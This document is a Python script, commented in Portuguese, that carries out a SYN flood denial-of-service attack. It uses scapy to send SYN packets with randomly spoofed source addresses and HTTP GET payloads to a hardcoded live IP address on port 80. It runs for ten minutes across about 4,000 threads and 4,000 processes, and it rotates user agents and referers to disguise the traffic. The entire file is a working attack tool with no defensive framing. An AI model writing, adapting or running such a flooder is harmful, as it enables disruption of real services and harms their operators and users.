import sys
import time
import threading
from multiprocessing import Process
from scapy.all import *
import random

target = "177.153.49.2"
port = 80
duration = 600  # Duração do ataque em segundos

# Lista de User Agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.91 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.111 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.131 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.141 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.151 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.161 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.171 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.181 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.191 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.201 Safari/537.36",
    # Adicione mais User Agents aqui
]

# Lista de Referers
referers = [
    "http://www.google.com",
    "http://www.bing.com",
    "http://www.yahoo.com",
    "http://www.youtube.com",
    "http://www.facebook.com",
    "http://www.amazon.com",
    "http://www.wikipedia.org",
    "http://www.twitter.com",
    "http://www.instagram.com",
    "http://www.linkedin.com",
    "http://www.reddit.com",
    "http://www.netflix.com",
    "http://www.microsoft.com",
    "http://www.apple.com",
    "http://www.stackoverflow.com",
    "http://www.github.com",
    "http://www.twitch.tv",
    "http://www.spotify.com",
    "http://www.ebay.com",
    "http://www.pinterest.com",
    # Adicione mais Referers aqui
]

# Adicionando mais User Agents
for _ in range(13):
    user_agents.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36")

# Adicionando mais Referers
for _ in range(16):
    referers.append("http://www.facebook.com")

def syn_flood(duration):
    start_time = time.time()
    end_time = start_time + duration
    while time.time() < end_time:
        try:
            ip_src = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
            ip = IP(dst=target, src=ip_src)
            tcp = TCP(dport=port, flags="S")
            user_agent = random.choice(user_agents)
            referer = random.choice(referers)
            http = "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nReferer: {}\r\n\r\n".format(target, user_agent, referer)
            pkt = ip / tcp / http
            send(pkt, verbose=0)
        except Exception as e:
            print("Erro ao enviar pacote: {}".format(e))

def main():
    threads = []
    processes = []
    duration_seconds = 600
    for _ in range(4024):
        thread = threading.Thread(target=syn_flood, args=(duration_seconds,))
        process = Process(target=syn_flood, args=(duration_seconds,))
        threads.append(thread)
        processes.append(process)

    print("Iniciando ataque SYN Flood em {}:{} por {} segundos.".format(target, port, duration))
    for thread in threads:
        thread.start()
    for process in processes:
        process.start()

    time.sleep(duration)
    for thread in threads:
        thread.join()
    for process in processes:
        process.join()

    print("Ataque SYN Flood concluído.")

if __name__ == "__main__":
    main()